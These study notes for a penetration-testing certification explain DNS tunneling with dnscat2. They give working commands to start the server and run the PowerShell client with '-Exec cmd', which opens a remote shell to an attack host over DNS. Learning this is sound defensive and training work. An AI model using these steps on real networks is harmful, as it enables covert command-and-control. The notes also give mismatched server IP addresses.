# 🧬 1. DNS Tunneling with Dnscat2

> [!info] What is DNS tunneling?  
> **DNS tunneling** abuses the DNS protocol as a transport channel for data that is not actually normal DNS information.
> 
> **Dnscat2** is a tunneling tool that uses DNS to communicate between two hosts. It establishes an **encrypted Command & Control (C&C/C2) channel** and transports data through DNS traffic, including **TXT records**.
> 
> The important CPTS concept is:
> 
> ```text
> Normal DNS:
> Host → DNS Server → DNS resolution
> 
> DNS tunneling:
> Host → DNS request containing tunnel data
>      → DNS infrastructure
>      → Attacker-controlled DNS server
>      → Tunnel data
> ```
> 
> This can provide a communication channel when more obvious protocols such as HTTP/HTTPS are restricted or monitored.

---

# 🌐 2. Why DNS Is Useful for Tunneling

DNS is normally essential in corporate networks.

A typical Active Directory environment has internal DNS infrastructure that resolves names such as:

```text
dc01.inlanefreight.local
fileserver.inlanefreight.local
web01.inlanefreight.local
```

The general DNS relationship can look like:

```text
Windows Host
     │
     │ DNS query
     ▼
Corporate DNS Server
     │
     │ If necessary, external resolution
     ▼
External DNS infrastructure
```

Because DNS traffic is commonly permitted, monitored systems may still need to allow DNS queries for normal network functionality.

Dnscat2 takes advantage of this trust in DNS.

Instead of sending only a legitimate hostname:

```text
www.example.com
```

the client can encode tunnel-related information into DNS traffic.

Conceptually:

```text
Client
  │
  │ DNS query containing encoded data
  ▼
DNS infrastructure
  │
  ▼
Dnscat2 DNS server
  │
  │ Decode / process tunnel data
  ▼
Attacker
```

> [!important]  
> DNS tunneling does **not** mean that DNS itself becomes a normal TCP-like tunnel.
> 
> Dnscat2 is building a communication channel **over DNS requests and responses**.

---

# 🔐 3. Dnscat2 Uses Encryption

Dnscat2 establishes an encrypted C2 channel.

The server generates a **pre-shared secret**, which the client must know.

The basic relationship is:

```text
                PRE-SHARED SECRET
                       │
             ┌─────────┴─────────┐
             │                   │
             ▼                   ▼
        Dnscat2 Server       Dnscat2 Client
             │                   │
             └─────────┬─────────┘
                       │
                       ▼
              Encrypted session
```

This means an established session can report:

```text
Session 1 Security: ENCRYPTED AND VERIFIED!
```

> [!warning] Important distinction  
> **Encryption protects the contents of the Dnscat2 session**, but it does not make the DNS traffic invisible.
> 
> Defenders can still detect suspicious DNS behavior through characteristics such as unusual query patterns, volumes, domains, and traffic behavior.

---

# 🧩 4. The Lab Architecture

The example uses:

```text
ATTACK HOST
10.10.14.18
     │
     │ DNS / UDP 53
     │
     ▼
Dnscat2 Server
     │
     │
     ▼
Windows Target
Dnscat2 Client
```

The Dnscat2 server runs on the attack host.

The Dnscat2 client runs on the Windows target.

The client establishes the connection **outward toward the Dnscat2 server**.

---

# 📥 5. Clone Dnscat2

If Dnscat2 is not already installed:

```bash
git clone https://github.com/iagox86/dnscat2.git
```

Move into the server directory:

```bash
cd dnscat2/server/
```

Install Bundler:

```bash
sudo gem install bundler
```

Then install the required Ruby dependencies:

```bash
sudo bundle install
```

The structure is conceptually:

```text
dnscat2/
├── server/
│   └── dnscat2.rb
└── ...
```

The important file for the attack host is:

```text
server/dnscat2.rb
```

---

# 🖥️ 6. Start the Dnscat2 Server

From the attack host:

```bash
sudo ruby dnscat2.rb --dns host=10.10.15.19,port=53,domain=inlanefreight.local --no-cache
```

Let's break this down.

|Option|Meaning|
|---|---|
|`sudo`|Run with elevated privileges, useful because binding to port 53 may require it|
|`ruby dnscat2.rb`|Start the Dnscat2 server|
|`--dns`|Configure the DNS transport|
|`host=10.10.14.18`|DNS server listening address|
|`port=53`|DNS port|
|`domain=inlanefreight.local`|Domain used by the Dnscat2 tunnel|
|`--no-cache`|Prevent DNS caching from interfering with tunnel traffic|

The server starts listening on:

```text
10.10.14.18:53
```

The output includes:

```text
Starting Dnscat2 DNS server on 10.10.14.18:53
[domains = inlanefreight.local]...
```

So conceptually:

```text
              ATTACK HOST
              10.10.14.18
                   │
                   │ UDP/53
                   ▼
            ┌──────────────┐
            │ Dnscat2      │
            │ DNS Server   │
            └──────────────┘
```

---

# 🔑 7. The Pre-Shared Secret

When the server starts, it generates a secret:

```text
0ec04a91cd1e963f8c03ca499d589d21
```

The server output provides an example such as:

```text
./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local
```

This secret must also be supplied to the client.

Why?

Because the client needs to authenticate to the Dnscat2 server and establish the encrypted session.

Think:

```text
Server
Secret = X
   │
   │ must match
   ▼
Client
Secret = X
```

If the client does not have the correct secret, the intended authenticated encrypted session cannot be established.

> [!important]  
> The secret is therefore not just a random configuration value. It is part of the mechanism used to establish the **encrypted and verified Dnscat2 session**.

---

# 🪟 8. Using the PowerShell Client

The target is Windows.

Instead of compiling or transferring the original client, the source provides an alternative:

**dnscat2-powershell**

This is a PowerShell-based client compatible with Dnscat2.

Clone it on the attack host:

```bash
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

You then transfer:

```text
dnscat2.ps1
```

to the Windows target using one of the file-transfer techniques covered earlier.

The important methodology is:

```text
Attack Host
     │
     │ transfer
     ▼
Windows Target
     │
     ▼
dnscat2.ps1
```

---

# 📦 9. Import `dnscat2.ps1`

On the Windows target:

```powershell
PS C:\htb> Import-Module .\dnscat2.ps1
```

This loads the PowerShell module and makes its Dnscat2 cmdlets available.

Before importing:

```text
Start-Dnscat2
     │
     └── ❌ command may not exist
```

After importing:

```text
Import-Module .\dnscat2.ps1
          │
          ▼
Start-Dnscat2
          │
          └── ✅ available
```

---

# 🚀 10. Establish the Dnscat2 Tunnel

On the Windows target:

```powershell
PS C:\htb> Start-Dnscat2 -DNSserver 10.10.15.19 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

This is the command that actually establishes the tunnel.

### `-DNSserver`

```text
-DNSserver 10.10.14.18
```

Specifies the Dnscat2 DNS server.

The client therefore knows where to send its DNS tunnel traffic.

### `-Domain`

```text
-Domain inlanefreight.local
```

Specifies the domain used for the Dnscat2 communication.

### `-PreSharedSecret`

```text
-PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21
```

Provides the secret generated by the Dnscat2 server.

It must correspond to the server's configured secret.

### `-Exec cmd`

```text
-Exec cmd
```

Requests that the Dnscat2 session provide a Windows command shell.

So rather than establishing only a data channel, we're asking Dnscat2 to give us:

```text
Dnscat2 tunnel
      │
      ▼
Windows cmd.exe
```

---

# 🔄 11. Complete Traffic Flow

The whole process is:

```text
┌─────────────────────┐
│    Attack Host      │
│    10.10.14.18      │
│                     │
│  Dnscat2 Server     │
│       UDP/53        │
└──────────┬──────────┘
           │
           │ DNS tunnel
           │
           ▼
┌─────────────────────┐
│    Windows Target   │
│                     │
│  dnscat2.ps1        │
│  Dnscat2 Client     │
└──────────┬──────────┘
           │
           ▼
       cmd.exe
```

But logically, the client is the side initiating the communication:

```text
Windows Target
     │
     │ DNS requests
     ▼
Attack Host
     │
     │ Dnscat2 server
     ▼
Encrypted C2 session
```

---

# ✅ 12. Confirm the Session

If everything works, the server reports:

```text
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

dnscat2>
```

This is an important confirmation.

We now have:

```text
Windows client
      │
      │ DNS
      ▼
Dnscat2 server
      │
      ▼
Session 1
      │
      ▼
ENCRYPTED AND VERIFIED
```

> [!success] What this tells you  
> The Dnscat2 client successfully communicated with the server and established the expected encrypted session.

---

# 🖥️ 13. Dnscat2 Interactive Console

At the:

```text
dnscat2>
```

prompt, type:

```text
?
```

to display available commands.

Output:

```text
Here is a list of commands (use -h on any of them for additional help):
* echo
* help
* kill
* quit
* set
* start
* stop
* tunnels
* unset
* window
* windows
```

These commands control the Dnscat2 session and its windows/tunnels.

---

# 🪟 14. Dnscat2 Windows

One concept that is particularly important is the **window**.

The server created:

```text
New window created: 1
```

This represents the established client session.

You can interact with it using:

```text
dnscat2> window -i 1
```

The `-i 1` tells Dnscat2 to interact with window/session `1`.

---

# 💻 15. Interacting with the Windows Shell

After:

```text
dnscat2> window -i 1
```

Dnscat2 reports:

```text
Session 1 Security: ENCRYPTED AND VERIFIED!
```

and:

```text
This is a console session!
```

The important behavior is:

```text
What you type
      │
      ▼
Dnscat2 tunnel
      │
      ▼
Windows target
      │
      ▼
cmd.exe
```

And the reverse:

```text
Windows cmd.exe output
      │
      ▼
Dnscat2 tunnel
      │
      ▼
Dnscat2 console
```

The source explains that anything typed is sent to the client and anything the client types is displayed back.

The Windows shell appears:

```text
Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
exec (OFFICEMANAGER) 1>
```

At this point, we effectively have a command shell over the DNS-based channel.

---

# ↩️ 16. Returning From the Session

While interacting with the console session, the source indicates:

```text
Ctrl-Z
```

can be used to return to the Dnscat2 console.

So conceptually:

```text
dnscat2>
    │
    └── window -i 1
            │
            ▼
       Windows CMD
            │
            │ Ctrl-Z
            ▼
         dnscat2>
```

This allows you to move between the main Dnscat2 console and an individual session.

---

# 🧠 17. Why Would an Attacker Use DNS Tunneling?

The methodology is based on **network restrictions**.

Imagine:

```text
Target
  │
  ├── HTTPS ──❌──► Attack Host
  │
  ├── HTTP  ──❌──► Attack Host
  │
  └── DNS   ──✅──► DNS infrastructure
```

If DNS traffic is permitted and can reach an attacker-controlled DNS infrastructure, DNS can potentially provide an alternative communication channel.

The thought process is:

```text
"I need communication with the compromised host."
                  │
                  ▼
       "Which outbound protocols work?"
                  │
                  ▼
             DNS works
                  │
                  ▼
       "Can data be transported
             through DNS?"
                  │
                  ▼
           DNS tunneling
                  │
                  ▼
              Dnscat2
```

This is the important CPTS methodology.

---

# 🔥 18. Why DNS Can Bypass Some Network Controls

A firewall may have rules that heavily restrict outbound connections:

```text
Internet access:
HTTP      ❌
HTTPS     ❌
SMB       ❌
SSH       ❌
DNS       ✅
```

DNS may still be allowed because normal corporate systems require DNS resolution.

Dnscat2 attempts to turn that allowed protocol into a communication channel.

```text
Allowed DNS
     │
     ▼
DNS queries/responses
     │
     ▼
Encoded tunnel data
     │
     ▼
Dnscat2
     │
     ▼
C2 / command channel
```

> [!warning] Stealth does not mean invisible  
> DNS tunneling can evade controls that focus only on traditional application protocols, but modern security systems can detect DNS tunneling using behavioral analysis, DNS logging, domain reputation, query entropy, frequency, unusual record usage, and other indicators.

---

# 🧭 19. CPTS Methodology: Choosing DNS Tunneling

When you have command execution but normal C2 communication fails:

```text
             COMPROMISED HOST
                    │
                    ▼
         Can it reach attack host?
               /          \
             YES           NO
              │             │
              ▼             ▼
       Normal C2 path    Analyze egress
                            │
                            ▼
                  Which protocols work?
                            │
             ┌──────────────┼──────────────┐
             ▼              ▼              ▼
           HTTP           HTTPS           DNS
             │              │              │
             ▼              ▼              ▼
          HTTP C2        HTTPS C2      DNS tunnel
                                          │
                                          ▼
                                       Dnscat2
```

So Dnscat2 is not something you automatically use after compromising a host.

You use it when the **network conditions make DNS an attractive transport**.

---

# 🆚 20. DNS Tunneling vs Other Pivot/C2 Techniques

|Technique|Transport|Main idea|
|---|---|---|
|Reverse shell|TCP/HTTP/etc.|Target connects back to attacker|
|Reverse SOCKS|TCP/SSH/etc.|Target/pivot establishes tunnel and exposes SOCKS|
|Socat|TCP|Socket-to-socket relay|
|Sshuttle|SSH|Route traffic through SSH|
|Rpivot|SOCKS over reverse connection|Pivot connects back and provides SOCKS|
|**Dnscat2**|**DNS**|**Tunnel data through DNS traffic**|

The key distinction is the **transport protocol**.

```text
SSH pivot:
SSH ───────────────► tunnel

Rpivot:
SOCKS ─────────────► tunnel

Dnscat2:
DNS ────────────────► tunnel
```

---

# 🔬 21. Important Technical Detail: DNS Is the Transport

A common misunderstanding is:

> "Dnscat2 turns DNS into RDP/SMB/HTTP routing."

The more useful mental model is:

```text
Application data
      │
      ▼
Dnscat2
      │
      ▼
Encode / transport through DNS
      │
      ▼
DNS request / response
      │
      ▼
Network
      │
      ▼
Dnscat2 server
      │
      ▼
Decode
      │
      ▼
Original session data
```

The DNS protocol is being used as the **carrier**.

That is why the technique is called:

> **DNS tunneling**

---

# ⚠️ 22. DNS Tunneling Has Limitations

DNS is not a perfect general-purpose transport.

Compared with normal TCP-based communication, DNS tunneling has constraints around:

- 📦 Amount of data that can be transported per query/response
    
- 🐌 Throughput
    
- 🔄 Request/response behavior
    
- 🌐 DNS infrastructure
    
- 🧪 Detection opportunities
    
- 🗃️ DNS caching
    

This explains why Dnscat2 is particularly interesting for **C2 and data transport**, rather than simply replacing every other tunneling technology.

The source specifically uses:

```text
--no-cache
```

because DNS caching can interfere with a tunneling protocol that expects queries to reach the appropriate server.

---

# 🧠 23. The Full Mental Model

Remember the entire process as:

```text
1. COMPROMISE WINDOWS HOST
          │
          ▼
2. NORMAL C2 MAY BE RESTRICTED
          │
          ▼
3. ANALYZE OUTBOUND TRAFFIC
          │
          ▼
4. DNS IS AVAILABLE
          │
          ▼
5. USE DNS AS TRANSPORT
          │
          ▼
6. Dnscat2 SERVER
   Attack Host
          │
          │ DNS
          ▼
7. Dnscat2 CLIENT
   Windows Host
          │
          ▼
8. ENCRYPTED SESSION
          │
          ▼
9. CMD SHELL
```

The most important reasoning is:

> **The network determines the transport.**

Not:

> "I know Dnscat2, therefore I should use Dnscat2."

Instead:

> "My normal communication path is restricted. DNS is available. Therefore, a DNS-based tunnel may provide another communication channel."

---

# 🎯 24. CPTS Decision Tree

```text
                    GOT CODE EXECUTION
                           │
                           ▼
                  Need remote communication?
                           │
                           ▼
                ┌──────────────────────┐
                │ Analyze egress       │
                │ connectivity         │
                └──────────┬───────────┘
                           │
            ┌──────────────┼──────────────┐
            ▼              ▼              ▼
          TCP/80        TCP/443         UDP/53
            │              │              │
            ▼              ▼              ▼
         HTTP C2        HTTPS C2      DNS tunnel
                                           │
                                           ▼
                                        Dnscat2
```

And if the goal is **internal network access rather than just a command channel**, ask a second question:

```text
Do I need:
    │
    ├── Command execution?
    │       └── Dnscat2 console/session
    │
    └── Network access to many internal services?
            └── Consider SOCKS/routing-based pivoting
```

> [!important] Don't confuse C2 with network pivoting  
> Dnscat2 primarily demonstrates a **DNS-based communication/C2 channel**.
> 
> It should not automatically be mentally grouped with tools whose primary purpose is creating a general SOCKS proxy or routing an entire subnet.

---

# 📌 25. Key Takeaways

- 🧬 **Dnscat2 tunnels data through DNS.**
    
- 🌐 DNS is used as the **transport protocol**.
    
- 🔐 Dnscat2 establishes an **encrypted and verified C2 channel**.
    
- 🔑 The client and server use a **pre-shared secret**.
    
- 🖥️ The Dnscat2 server runs on the attack host.
    
- 🪟 The Dnscat2 client can run on the compromised Windows host.
    
- `server.py` is not involved here; Dnscat2 uses its own Ruby server.
    
- `dnscat2.ps1` provides a PowerShell-based Windows client.
    
- `Start-Dnscat2` establishes the client-side connection.
    
- `-DNSserver` specifies the Dnscat2 server.
    
- `-Domain` specifies the DNS domain used by the tunnel.
    
- `-PreSharedSecret` provides the authentication/encryption secret.
    
- `-Exec cmd` requests a Windows command shell.
    
- `window -i 1` enters the established Dnscat2 session.
    
- `Ctrl-Z` returns from the console session to the Dnscat2 interface.
    
- DNS tunneling can be useful when normal outbound communication is restricted.
    
- DNS tunneling is **not invisible**; modern monitoring can detect anomalous DNS behavior.
    
- DNS has lower throughput and different constraints than normal TCP connections.
    
- The most important CPTS skill is identifying **which outbound transport is actually available** and selecting a technique that matches it.
    

> [!success] Final mental model
> 
> ```text
> Normal C2 blocked
>        │
>        ▼
> Analyze egress
>        │
>        ▼
> DNS allowed
>        │
>        ▼
> Dnscat2 client
>        │
>        │ DNS traffic
>        ▼
> Dnscat2 server
>        │
>        ▼
> Encrypted C2 session
>        │
>        ▼
> Windows command shell
> ```
> 
> **Topology → egress restrictions → available transport → tunneling technique → session.**
> 
> That is the methodology you should retain for CPTS, rather than memorizing Dnscat2 commands in isolation.